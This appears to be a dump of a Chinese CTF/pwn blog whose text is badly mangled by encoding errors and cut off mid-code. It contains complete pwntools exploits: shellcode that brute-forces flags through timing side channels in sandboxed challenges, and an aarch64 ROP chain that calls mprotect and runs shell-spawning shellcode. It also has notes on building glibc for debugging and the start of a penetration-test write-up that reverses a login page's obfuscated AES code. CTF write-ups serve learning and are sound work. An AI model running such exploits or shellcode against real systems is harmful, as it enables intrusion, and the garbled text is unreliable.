cl, dl             ; æ¯”è¾ƒå¯„å­˜å™¨ cl å’Œ dl çš„å€¼        jz loop                ; å¦‚æœç›¸ç­‰ï¼Œè·³è½¬åˆ° loop æ ‡ç­¾        mov al, 60             ; å°†ç³»ç»Ÿè°ƒç”¨å· 60ï¼ˆexitï¼‰åŠ è½½åˆ°å¯„å­˜å™¨ al         syscall                ; æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ exit                            loop:                   ;å¾ªç¯        jmp loop        &#x27;&#x27;&#x27;.format(dis,char))    p.send(shellcode)\n\næˆ‘æœ¬åœ°ç¯å¢ƒä¸‹çš„flagå¦‚ä¸‹ï¼š\ntouch flag &amp;&amp; echo flag&#123;th1s_1S_a_T3st_f1ag&#125; &gt; flag\nå®Œæ•´exp\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;critical&#x27;,endian=&quot;little&quot;)def exp(index,char):    p.recvuntil(b&quot;Welcome to silent execution-box.\\n&quot;)    shellcode = asm(&#x27;&#x27;&#x27;        mov r12,0x67616c66        push r12        mov rdi,rsp        xor esi,esi        xor edx,edx        mov al,2        syscall                                             mov rdi,rax        mov rsi,0x10700        mov dl,0x40        xor rax,rax        syscall                                             mov dl, byte ptr [rsi+&#123;&#125;]          mov cl, &#123;&#125;                     cmp cl, dl                     jz loop                        mov al, 60                     syscall                                            loop:        jmp loop        &#x27;&#x27;&#x27;.format(index,char))    p.send(shellcode)flag = &quot;&quot;#possible_char = list(&quot;&#125;&#123;-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)#possible_char.append(&#x27;\\x00&#x27;)for i in range(len(flag),35):    sleep(1)    print(&quot;flag : &#123;&#125;&quot;.format(flag))    for j in range(0x20,0x80):        p = process(&#x27;./chall&#x27;)        try:            exp(i,j)            p.recvline(timeout=1)            flag += chr(j)            p.send(b&#x27;\\n&#x27;)            print(&quot;&#123;&#125; pos : &#123;&#125; success&quot;.format(i,chr(j)))            p.close()            break        except:                       p.close()\n\næ²¡æ’ç”µç¼–è¯‘æ—¶é—´é•¿ï¼Œä¸‹åˆç»™æˆ‘ç”µæ‰“æ²¡äº†è¿˜æ²¡çˆ†å‡ºæ¥ï¼Œæ™šä¸Šæ’ä¸Šç”µå‡ åˆ†é’Ÿå°±å‡ºäº†\n[xman2019 nooocall]ä¿æŠ¤å…¨å¼€æ²™ç›’banæ‰äº†ç³»ç»Ÿè°ƒç”¨ç¨‹åºä¹Ÿæ˜¯è¾“å…¥å•¥å°±æ‰§è¡Œå•¥ï¼Œflagå·²ç»è¢«è¯»å…¥åˆ°å†…å­˜ï¼Œä½†æ˜¯åªç»™äº†0x10çš„å¤§å°å¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼çˆ†ç ´ï¼ˆorå·²ç»æ‰§è¡Œäº†ï¼‰ï¼Œä½†æ˜¯é•¿åº¦é™åˆ¶ï¼Œåªèƒ½è·³å›shellcodeè‡ªå·±èº«ä¸Š\ndef exp (index,char):    shellcode = asm(&#x27;&#x27;&#x27;        mov rax,[rsp+0x10]        mov rax,[rax+0x18]        mov al,byte ptr[rax+&#123;&#125;]        cmp al,&#123;&#125;        jz $-0x2        &#x27;&#x27;&#x27;.format(index,char))    p.sendlineafter(b&#x27;Your Shellcode &gt;&gt;&#x27;, shellcode)\nå®Œæ•´exp\nfrom pwn import *import timecontext(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;critical&#x27;,endian=&quot;little&quot;)#possible_char = list(&quot;&#125;&#123;-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)#possible_char.append(&#x27;\\x00&#x27;)flag = &#x27;&#x27;i = 0def exp (index,char):    shellcode = asm(&#x27;&#x27;&#x27;        mov rax,[rsp+0x10]        mov rax,[rax+0x18]        mov al,byte ptr[rax+&#123;&#125;]        cmp al,&#123;&#125;        jz $-0x2        &#x27;&#x27;&#x27;.format(index,char))    p.sendlineafter(b&#x27;Your Shellcode &gt;&gt;&#x27;, shellcode)while 1:    print(&quot;flag : &#123;&#125;&quot;.format(flag))    length = len(flag)    for j in range(0x20,0x80):        p = process(&#x27;./xman_2019_nooocall&#x27;)        #p = remote(&#x27;node5.buuoj.cn&#x27;, 29290)                exp(i,j)        start = time.time()        p.can_recv_raw(timeout=3)        end = time.time()        p.close()        #çˆ†ä¸å‡ºæ­£ç¡®flagéœ€è¦è°ƒè¿™é‡Œï¼Œå¯èƒ½æ˜¯ç½‘ç»œåŸå› å¯¼è‡´çš„        if end - start &gt; 3:            flag += chr(j)            print(&quot;&#123;&#125; pos : &#123;&#125; success&quot;.format(i,chr(j)))            i += 1            break\nbuuä¸Šè¿œç¨‹çš„çˆ†ä¸ç©¿ï¼Œè¿˜å¾—è°ƒï¼Œæœ¬åœ°çš„å€’æ˜¯å¾ˆå¿«å‡ºæ¥äº†ï¼‰\n"},{"title":"æŒ‡å®šglibcç¼–è¯‘&&debug","url":"/2024/03/19/%E6%8C%87%E5%AE%9Aglibc%E7%BC%96%E8%AF%91-debug/","content":"ä¹‹å‰ä¸€ç›´éƒ½ç”¨æµ·é‡çš„è™šæ‹Ÿæœºè§£å†³ç¼–è¯‘ç­‰é—®é¢˜å¦‚å›¾:)å­¦åˆ°ç°åœ¨å‘ç°ä¸æ˜¯LTSç‰ˆæœ¬çš„ubuntuç»´æŠ¤èµ·æ¥æå…¶éº»çƒ¦\nä»¥ä¸‹å®ç°ä¸€è™šæ‹Ÿæœºä¸‹ä½¿ç”¨ä¸åŒç‰ˆæœ¬glibc\né¦–å…ˆå…ˆä¸‹è½½æºç https://ftp.gnu.org/gnu/glibc/\nä¹‹åè§£å‹åˆ°ç›®å½•ä¸‹\ntar zxvf glibc-2.32.tar.gz\n&#x2F;&#x2F;ä»¥ä¸‹ï¼š~&#x2F;Desktop&#x2F;glibc-2.32&#x2F;glibc-2.32 &#x3D; &#x2F;path&#x2F;to&#x2F;your&#x2F;libc\nmkdir buildcd build~/Desktop/glibc-2.32/glibc-2.32/configure --build=x86_64-pc-linux-gnu --prefix=$HOME/Desktop/glibc-2.32/buildmake -j8make install\nè¿™é‡Œconfigureçš„æ—¶å€™å¯èƒ½ä¼šæç¤ºéœ€è¦æŸäº›ä¾èµ–æˆ–è€…è½¯ä»¶ï¼Œæ ¹æ®æç¤ºä¿¡æ¯ä¸‹è½½å°±è¡Œæ¯”å¦‚æˆ‘è¿™é‡Œæç¤ºç¼ºå°‘gawké‚£ä¹ˆå°±\nsudo apt install gawk\n\nmakeæ—¶é—´è¾ƒé•¿ï¼Œä¸æŠ¥é”™å°±è¡Œ\nè¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„è²Œä¼¼makeæˆåŠŸä¸å¦ä¸gccç‰ˆæœ¬æœ‰å…³ç³»ï¼Œå¦‚ä¸‹æ˜¯æˆ‘çš„å°è¯•ä¿¡æ¯æˆåŠŸå¤±è´¥20.04å¯è¡Œ 22.04ä¸å¯è¡Œï¼ŒçŒœæµ‹ä¸ºä½ç‰ˆæœ¬gccèƒ½ç¼–è¯‘é«˜ç‰ˆæœ¬glibcæºç  å¾…æµ‹è¯•\næˆåŠŸèµ°å®Œè¿™é‡Œèƒ½ç”¨äº†gccç¼–è¯‘ç¤ºä¾‹ã€‚\ngcc -Wl,-rpath,~/Desktop/glibc-2.32/glibc-2.32 kiwi.c -o k1w1 -static -z noexecstack -fstack-protector-all -pie -z now -masm=intel\n\nè‹¥è¦åœ¨gdbä¸­å¯ç”¨ï¼Œåˆ™éœ€è¦è¿›å…¥gdbåæ‰‹åŠ¨æŒ‡å®šï¼Œå¦‚ä¸‹è‹¥ä½¿ç”¨pwntoolsè„šæœ¬å¯åŠ¨ï¼Œåˆ™åœ¨å¯åŠ¨æ—¶å¦‚ä¸‹ä½¿ç”¨\nfrom pwn import *p = process([&quot;/home/str1k3/Desktop/glibc-2.32/elf/ld.so&quot;,&quot;./pwnfile&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;/home/str1k3/Desktop/glibc-2.32/libc.so.6&quot;&#125;)\n\nå¯ä»¥ä½¿ç”¨xclibcé¡¹ç›®æ¥åˆ‡æ¢è¿è¡Œlibcç¯å¢ƒï¼Œä»¥ä¸‹æ¥è‡ªé¡¹ç›®çš„READMEï¼šè¿™ä¸ªè„šæœ¬æ˜¯åŸºäºæœ€æ–°ç‰ˆçš„glibc-all-in-oneï¼Œæˆ‘å»ºè®®ä½ å°†å…¶å®‰è£…åˆ°~ç›®å½•\ngit clone https://github.com/matrix1001/glibc-all-in-onecd glibc-all-in-one./update_list\n\nxclibcè„šæœ¬é…ç½®\ngit clone https://github.com/ef4tless/xclibc.gitcd xclibcsudo rm /usr/local/bin/xclibcsudo mv ./xclibc /usr/local/binsudo chmod +x /usr/local/bin/xclibc\n\næœ¬åœ°libcåº“éƒ¨ç½²(*å¯é€‰)\nxclibc -d allxclibc -d old\n\nä½¿ç”¨xclibc [é€‰é¡¹] [å‚æ•°]-s [libcæ–‡ä»¶] # æŸ¥çœ‹libcæ–‡ä»¶ç‰ˆæœ¬-x [-n] [æ–‡ä»¶] [libcæ–‡ä»¶] # ä¸€é”®ç»™æ–‡ä»¶é…ç½®libcæ–‡ä»¶ç›¸åº”ç‰ˆæœ¬çš„ç¯å¢ƒï¼ˆæ·»åŠ -né€‰é¡¹å¯ä»¥ä½¿ç”¨ä¿®æ”¹--replace-neededçš„æ–¹å¼å®ç°ï¼‰-c [-n] [æ–‡ä»¶] [libcå¤§ç‰ˆæœ¬å·] [libcå°ç‰ˆæœ¬ç¯å¢ƒè·¯å¾„] # ç»™æ–‡ä»¶é…ç½®æŒ‡å®šçš„libcç¯å¢ƒï¼Œè¾“å…¥å¤§ç‰ˆæœ¬å·åå›è½¦ï¼Œå¯è‡ªç”±é€‰æ‹©å¤åˆ¶libcå°ç‰ˆæœ¬ç¯å¢ƒè·¯å¾„ï¼ˆæ·»åŠ -né€‰é¡¹å¯ä»¥ä½¿ç”¨ä¿®æ”¹--replace-neededçš„æ–¹å¼å®ç°ï¼‰-d &lt;-r/-u&gt; [version]/[all]/[old]#  -d [ENTER] å¯ä»¥æŸ¥çœ‹æ‰€æœ‰å¯ä¸‹è½½çš„libcç‰ˆæœ¬#  -d -r [version] åˆ é™¤ç›¸åº”çš„libcç‰ˆæœ¬åº“#  -d -u æ›´æ–°glibc-all-in-one libcç‰ˆæœ¬åˆ—è¡¨(å³æ¸…åæºä¸Šæœ‰çš„libcç‰ˆæœ¬åˆ—è¡¨)#  -d all ä¸‹è½½æ‰€æœ‰æºä¸Šæœ‰çš„libcç‰ˆæœ¬#  -d [version] ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„libc-e [debåŒ…] # è§£å‹ç›¸åº”çš„libc_debåŒ…è‡³glibc_all_in_oneè·¯å¾„ï¼Œé€šå¸¸ä¸€ä¸ªç‰ˆæœ¬éœ€è¦è§£å‹ä¸€ä»½æœ¬ä½“debå’Œä¸€ä»½debug_debåŒ…-r [æ–‡ä»¶] # æ¢å¤ä¿®æ”¹è¿‡çš„æ–‡ä»¶è‡³åˆå§‹çŠ¶æ€-h # å±•ç¤ºå¸®åŠ©æç¤º-v # æ˜¾ç¤ºç‰ˆæœ¬å·\nå¥½ç”¨çˆ±ç”¨xclibcèƒ½ä¸‹è½½åˆ°çš„ä¸œè¥¿æ¯”glibc-all-in-oneå¤šï¼Œå¤§èµ\n","categories":["plays"],"tags":["plays"]},{"title":"ç¬¬ä¸€ä¸ªaarch64_pwn","url":"/2024/04/08/%E7%AC%AC%E4%B8%80%E4%B8%AAarm-pwn/","content":"å…ˆå­˜ä¸ªå¼‚æ„ç¨‹åºçš„è°ƒè¯•çš„ç¯å¢ƒæ­å»º,è¿™é‡Œä»¥aarch64ä¸ºä¾‹å­\ngdbä¸æ”¯æŒå¼‚æ„ï¼Œéœ€è¦ä¸‹è½½æ’ä»¶\nsudo apt-get install gdb-multiarchsudo apt-get install gcc-aarch64-linux-gnu\nè¿™ä¸€æ­¥å¯èƒ½ä¼šæœ‰é—®é¢˜è§£å†³æ–¹æ³•æœªçŸ¥ï¼Œæˆ‘ç›´æ¥è£…äº†æ–°çš„è™šæ‹Ÿæœºï¼‰\nå¯åŠ¨æ—¶ä½¿ç”¨\ngdb-multiarch\nç„¶åè®¾ç½®ä¸€ä¸‹æ¶æ„æ­¤æ—¶æ³¨æ„ï¼Œç›´æ¥debugæ˜¯ä¸è¡Œçš„ï¼ˆå¼‚æ„æ€ä¹ˆå¯èƒ½æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯é™æ€ç¼–è¯‘çš„ç¨‹åºè²Œä¼¼èƒ½è·‘ï¼Œä½†åœ¨gdbè°ƒè¯•æ—¶æ˜¾ç¤ºçš„æ˜¯x86çš„æ±‡ç¼–ï¼Œæ€ªï¼‰åœ¨åˆ†åˆ«æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åï¼ˆaarch64ï¼‰\nset architecture aarch64file pwnfilerun\né‡åˆ°è¿‡ä¸€ä¸ªbug(?)ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹\nStarting program: /home/str1k3/Desktop/gadget_database /build/gdb-ZgDh0V/gdb-12.1/gdb/i387-tdep.c:597: internal-error: i387_supply_fxsave: Assertion `tdep-&gt;num_xmm_regs &gt; 0&#x27; failed.A problem internal to GDB has been detected,further debugging may prove unreliable.----- Backtrace -----0x5c992bd4a197 ???0x5c992c149464 ???0x5c992c1496a0 ???0x5c992c4adc64 ???0x5c992bea1b18 ???0x5c992bcce6c5 ???0x5c992bcc6800 ???0x5c992c0feea0 ???0x5c992c0037d9 ???0x5c992c003821 ???0x5c992c00752c ???0x5c992c005868 ???0x5c992bef0de5 ???0x5c992bef4d62 ???0x5c992c101ebf ???0x5c992bf64ea9 ???0x5c992be670fa ???0x5c992beaac8d ???0x5c992bef2a7c ???0x5c992beb145e ???0x5c992bd7f774 ???0x5c992c10fd94 ???0x5c992be4d6e4 ???0x5c992be4da83 ???0x5c992be4e206 ???0x7ca61124de0d ???0x5c992be4c7d5 ???0x5c992be4e0b4 ???0x5c992be4c3cb ???0x5c992c4ae395 ???0x5c992c4ae82a ???0x5c992bf1871c ???0x5c992bf1a404 ???0x5c992bc740ef ???0x7ca60fe29d8f __libc_start_call_main\t../sysdeps/nptl/libc_start_call_main.h:580x7ca60fe29e3f __libc_start_main_impl\t../csu/libc-start.c:3920x5c992bc79e24 ???0xffffffffffffffff ???---------------------This is a bug, please report it.  For instructions, see:&lt;https://www.gnu.org/software/gdb/bugs/&gt;.å·²ä¸­æ­¢ (æ ¸å¿ƒå·²è½¬å‚¨)\n\nå¯ä»¥ä½¿ç”¨qemuæ¥æ¨¡æ‹Ÿaarch64ç¯å¢ƒåªè°ƒè¯•çš„è¯å¯ä»¥åªç”¨useræ¨¡å¼\nsudo apt-get install qemu-usersudo apt-get install qemu-user-binfmtsudo apt-get install &quot;binfmt*&quot;\n\næ­¤æ—¶å¯ä»¥è¿™æ ·æ¥è°ƒè¯•-gæŒ‡å®šç«¯å£ï¼Œ-LæŒ‡å®šè¿è¡Œåº“\nqemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./pwnfile\nç„¶ååœ¨å¦ä¸€ä¸ªshellä¸‹\ngdb-multiarchset architecture aarch64target remote :1234\nå³å¯å¼€å§‹è°ƒè¯•\nå¦‚æœè¦ç”¨è„šæœ¬åˆ™\np = process([&quot;qemu-aarch64&quot;,&quot;-g&quot;,&quot;2345&quot;,&quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])\nä¹Ÿå¯ä»¥ä½¿ç”¨socat(ç›¸å½“äºæ‰“è¿œç¨‹äº†ï¼Œåæ­£ä¸€èˆ¬é¶æœºéƒ½æ˜¯ç”¨qemuæ¥æ¨¡æ‹Ÿçš„)\nå…ˆè·‘èµ·æ¥\nsocat tcp-l:10002,fork exec:&quot;qemu-aarch64 -g 2345 -L /usr/aarch64-linux-gnu  ./gadget_database&quot;;reuseaddr\nåœ¨éœ€è¦è°ƒè¯•çš„è„šæœ¬ä¸­\np = remote(&#x27;127.0.0.1&#x27;,10002)pause()\nè¶pauseçš„æ—¶å€™ï¼Œå¯åŠ¨gdb-multiarch\nset architecture aarch64target remote :2345\nå°±å¯ä»¥æ­£å¸¸è°ƒè¯•è„šæœ¬ï¼Œæ•ˆæœå¦‚ä¸‹è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„\næœ‰ä¸ªé—®é¢˜å°±æ˜¯qemuçš„gdbserverä¼šå ç”¨ç«¯å£ï¼Œå¯¼è‡´å¦‚æœéœ€è¦ç¬¬äºŒæ¬¡è°ƒè¯•åˆ™éœ€è¦æ”¹ç«¯å£\nç¯å¢ƒæ­å¥½äº†ï¼Œæ¥ç‚¹å¥½ç©çš„8\n[RITSEC CTF 2024]gadget_database*é™„ä»¶ä¸‹è½½\né™æ€ç¼–è¯‘çš„aarch64ç¨‹åºè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘ä½¿ç”¨IDApro7.7è²Œä¼¼æ˜¯ä¸èƒ½æ­£ç¡®åç¼–è¯‘çš„æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ghidraå›ç­”åæœ‰ä¸€ä¸ªæ ˆæº¢å‡º\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = remote(&quot;127.0.0.1&quot;,10003)pause()p.sendlineafter(&quot;enter password\\n&quot;,&quot;RS&#123;REALFLAG&#125;&quot;)payload = b&quot;a&quot;*44+p64(0xdeadbeef)p.sendline(payload)p.interactive()\næµ‹å¾—åç§»ä¸º44å¯ä»¥ç”¨è¿™ä¸‰ä¸ªgadgetæ¥æ§åˆ¶å¯„å­˜å™¨ï¼Œå…ˆé€šè¿‡readæŠŠshellcodeå†™åˆ°bssé‡Œï¼Œå†ç”¨mprotectç»™æ‰§è¡Œæƒé™ï¼Œæœ€åè·³åˆ°shellcodeä¸Šæ‰§è¡Œã€‚\n0x0000000000425ab4 : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x50 ; ret0x000000000041ddf8 : mov x1, x23 ; mov x5, x26 ; mov x3, x21 ; mov x0, x20 ; mov w7, #1 ; mov w6, #0 ; mov x4, #0 ; blr x190x0000000000406bd8 : mov x2, x22 ; blr x3\nshellcode asmä¸å‡ºæ¥ï¼Œæˆ‘ç”¨æ ‘è“æ´¾asmçš„ï¼‰ï¼Œé¡ºä¾¿å°±å­˜ä¸‹æ¥\nfrom pwn import *# from LibcSearcher import *context(arch = &#x27;aarch64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)#p=remote(&quot;ctf.ritsec.club&quot;,30865)p = remote(&quot;127.0.0.1&quot;,10002)elf = ELF(&#x27;./gadget_database&#x27;)def debug():    gdb.attach(p)    pause()mprotect = 0x4201C0p.sendlineafter(&quot;enter password\\n&quot;,&quot;RS&#123;REALFLAG&#125;&quot;)# debug()p.recvuntil(&quot;Enter a query\\n&quot;)# read(0,bss,0x100)bss = 0x49f000read = 0x41f388x19 = 0x0000000000406bd8x20 = 0x21 = readx22 = 0x100x23 = bssx24 = 0x415488x29 = 0x9x30 = 0x000000000041ddf8payload = b&quot;a&quot;*44+p64(0x0000000000425ab4)+p64(x29)+p64(x30)+p64(x19)+p64(x20)+p64(x21)+p64(x22)+p64(x23)+p64(x24)payload += p64(0xdeadbeef)*3#mprotect(0x0000000000406bd8,0x1000,0x7)bss = 0x49f000mprotect = 0x0000000004201C0x19 = 0x0000000000406bd8x20 = bssx21 = mprotectx22 = 7x23 = 0x1000x24 = 0x415488x29 = 0x9x30 = 0x000000000041ddf8payload += p64(0x0000000000425ab4)+p64(0)*4+p64(x29)+p64(x30)+p64(x19)+p64(x20)+p64(x21)+p64(x22)+p64(x23)+p64(x24)payload += b&quot;a&quot;*24 + p64(bss)p.sendline(payload)input()#shellcode = asm(shellcraft.sh())shellcode  = b&quot;\\xeeE\\x8c\\xd2.\\xcd\\xad\\xf2\\xee\\xe5\\xc5\\xf2\\xeee\\xee\\xf2\\x0f\\r\\x80\\xd2\\xee?\\xbf\\xa9\\xe0\\x03\\x00\\x91\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xa8\\x1b\\x80\\xd2\\x01\\x00\\x00\\xd4&quot;p.sendline(shellcode)p.interactive()","categories":["plays"],"tags":["plays"]},{"title":"è®°ä¸€ä¸ªé€†å¤©çš„request","url":"/2025/04/29/%E8%AE%B0%E4%B8%80%E4%B8%AA%E9%80%86%E5%A4%A9%E7%9A%84request/","content":"loginæ—¥å¸¸æ¸—é€ingâ€¦åœºæ™¯åŠ è½½ä¸­â€¦åŸå§‹è¾“å…¥ï¼šusername:admin123        password:admin123\nPOST /contingency/xxx/login HTTP/1.1Host: example.comConnection: keep-aliveContent-Length: 445sec-ch-ua-platform: &quot;Windows&quot;X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;135&quot;, &quot;Not-A.Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;135&quot;Content-Type: application/x-www-form-urlencoded; charset=UTF-8sec-ch-ua-mobile: ?0Origin: https://example.comSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://example.com/contingency/xxx/indexAccept-Encoding: gzip, deflate, br, zstdAccept-Language: zh-CN,zh;q=0.9params=eyJhY2NvdW50IjoiVklXVFpiUkh2NjI4b3draUk5a0RMdz09IiwicGFzc3dvcmQiOiJWSVdUWmJSSHY2Mjhvd2tpSTlrREx3PT0iLCJrYXB0Y2hhIjoicHltYk85SXVOU0NaWUVFVDZaVjBEdz09IiwidXVpZCI6IjlGbzlpYkdKdlJxZXRCWXJ1WUVMbmkyNUNNakduc3N5aFRXT3dTVU1qSVFzRGpaNCtodWNVaWNMTmw2SmNMQysiLCJ2ZXJzaW9uIjoiYW5kcm9pZCIsInR5cGUiOjAsInZ0eXBlIjoiMSIsImVjYXRpZCI6IjBkQVhKV1N2eGJYM3V5aXpDQm1mSWc9PSIsImFjY3NtcyI6IjBkQVhKV1N2eGJYM3V5aXpDQm1mSWc9PSIsIlRpbWVzdGFtcCI6MTc0NTkxMDQ2NTEzNX0=\nçœ‹èµ·æ¥æ˜¯jwt,æä¸€ä¸‹(å¾—å…ˆè½¬ä¸€æ¬¡url)ï¼Ÿæå¤´å»å°¾åªç•™payload\n&#123;  &quot;account&quot; : &quot;VIWTZbRHv628owkiI9kDLw==&quot;,  &quot;password&quot; : &quot;VIWTZbRHv628owkiI9kDLw==&quot;,  &quot;kaptcha&quot; : &quot;pymbO9IuNSCZYEET6ZV0Dw==&quot;,  &quot;uuid&quot; : &quot;9Fo9ibGJvRqetBYruYELni25CMjGnssyhTWOwSUMjIQsDjZ4+hucUicLNl6JcLC+&quot;,  &quot;version&quot; : &quot;android&quot;,  &quot;type&quot; : 0,  &quot;vtype&quot; : &quot;1&quot;,  &quot;ecatid&quot; : &quot;0dAXJWSvxbX3uyizCBmfIg==&quot;,  &quot;accsms&quot; : &quot;0dAXJWSvxbX3uyizCBmfIg==&quot;,  &quot;Timestamp&quot; : 1745910465135&#125;\nè¿™é‡Œçš„baseçœ‹ç€ä¸å¤§å¯¹åŠ²ï¼Œè§£ç å‘ç°åº”è¯¥æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œè€ƒè™‘AESåŠ å¯†åçš„ç»“æœã€‚è§‚å¯Ÿåˆ°jsé‡Œæœ‰ä¸ªAES_util,å»çœ‹çœ‹\nvar CryptoJS=document[&quot;\\u0077\\u0072\\u0069\\u0074\\u0065&quot;](&quot;&gt;tpircs/&lt;&gt;&#x27;sj.sea/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));var base64=document[&quot;\\u0077\\u0072\\u0069\\u0074\\u0065&quot;](&quot;&gt;tpircs/&lt;&gt;&#x27;sj.46esab/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));(function(_0x2aea55,_0x2e748c)&#123;function _0x5d75a2(_0xfa7611,_0x826155,_0x142aa5,_0x2f38d2,_0x4f13a3)&#123;return _0x443f(_0x826155- -0x269,_0x2f38d2);&#125;function _0x20b738(_0x43a86a,_0x236ea2,_0x4277db,_0x58fcc9,_0x455dc8)&#123;return _0x443f(_0x455dc8- -0x188,_0x58fcc9);&#125;function _0x1e3d5b(_0x2f499a,_0xcf883d,_0x512890,_0x3bba1e,_0x740335)&#123;return _0x443f(_0x2f499a-0x14f,_0x3bba1e);&#125;var _0x2ad42e=_0x2aea55();function _0x3d720e(_0x12ddf5,_0x587ddd,_0x38da58,_0x2a12bd,_0x4eeffd)&#123;return _0x443f(_0x38da58-0x161,_0x2a12bd);&#125;function _0x2446fa(_0x5f3621,_0x1ae4e7,_0x38695c,_0x1cc263,_0x13bf6e)&#123;return _0x443f(_0x38695c-0x3cf,_0x1ae4e7);&#125;while(!![])&#123;try&#123;var _0x122ced=parseInt(_0x5d75a2(-0x268,-0x264,-0x26e,-0x267,-0x267))/0x1*(parseInt(_0x5d75a2(-0x24a,-0x24e,-0x248,-0x249,-0x24e))/0x2)+-parseInt(_0x3d720e(0x181,0x17f,0x177,0x17f,0x179))/0x3*(-parseInt(_0x5d75a2(-0x24b,-0x259,-0x260,-0x267,-0x250))/0x4)+-parseInt(_0x20b738(-0x176,-0x172,-0x16c,-0x178,-0x167))/0x5*(parseInt(_0x2446fa(0x3fa,0x3db,0x3eb,0x3e3,0x3f9))/0x6)+parseInt(_0x5d75a2(-0x25c,-0x265,-0x26a,-0x26a,-0x25f))/0x7+parseInt(_0x5d75a2(-0x24c,-0x252,-0x248,-0x260,-0x240))/0x8+parseInt(_0x20b738(-0x194,-0x17d,-0x188,-0x178,-0x188))/0x9*(parseInt(_0x1e3d5b(0x150,0x151,0x148,0x161,0x157))/0xa)+-parseInt(_0x5d75a2(-0x253,-0x25d,-0x25e,-0x264,-0x25b))/0xb;if(_0x122ced===_0x2e748c)&#123;break;&#125;else&#123;_0x2ad42e[&quot;\\u0070\\u0075\\u0073\\u0068&quot;](_0x2ad42e[&quot;\\u0073\\u0068\\u0069\\u0066\\u0074&quot;]());&#125;&#125;catch(_0x40a231)&#123;_0x2ad42e[&quot;\\u0070\\u0075\\u0073\\u0068&quot;](_0x2ad42e[&quot;\\u0073\\u0068\\u0069\\u0066\\u0074&quot;]());&#125;&#125;&#125;)(_0x5154,0x37ac5);var _0x5f=0x6+0x9;function _0x4d1802(_0x5ec7f3,_0x5d6a04,_0x4eea62,_0x3948d7,_0x3e3f76)&#123;return _0x443f(_0x3e3f76- -0x1f5,_0x3948d7);&#125;var aeskeyOriginal=_0x4d1802(-0x1cb,-0x1e3,-0x1dc,-0x1d6,-0x1dd);function _0x443f(_0x3c35be,_0x5154ce)&#123;var _0x443fce=_0x5154();_0x443f=function(_0x56e89c,_0x384a2)&#123;_0x56e89c=_0x56e89c-0x0;var _0x5089ac=_0x443fce[_0x56e89c];return _0x5089ac;&#125;;return _0x443f(_0x3c35be,_0x5154ce);&#125;function _0x5154()&#123;var _0x31fd54=[&quot;\\u0065\\u006e\\u0063&quot;,&quot;KINoJq9212251&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;VwGnXp112&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0070\\u0061\\u0072\\u0073\\u0065&quot;,&quot;kcolBtpyrced&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;gnirtsbus&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;htgnel&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;Pkcs7&#x27;,&quot;dap&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;bfkGlR4990788&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;lib&#x27;,&quot;dnetxe&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0055\\u0074\\u0066\\u0038&quot;,&quot;JZWyCW6922411&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0045\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u0072&quot;,&quot;\\u0041\\u0045\\u0053&quot;,&quot;cdph&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u0072&quot;,&#x27;ehpe&#x27;,&quot;\\u0033\\u0073\\u0056\\u0041\\u0042\\u0046\\u0062&quot;,&#x27;3260760oYubim&#x27;,&#x27;202306045YDZCWGZ&#x27;,&quot;rehpic_&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;FbKtv&#x27;,&quot;ClRYxq0501&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;4194meseVb&#x27;,&quot;gnirtSot&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&#x27;jrCCd&#x27;,&quot;\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074&quot;,&quot;\\u0042\\u006c\\u006f\\u0063\\u006b\\u0043\\u0069\\u0070\\u0068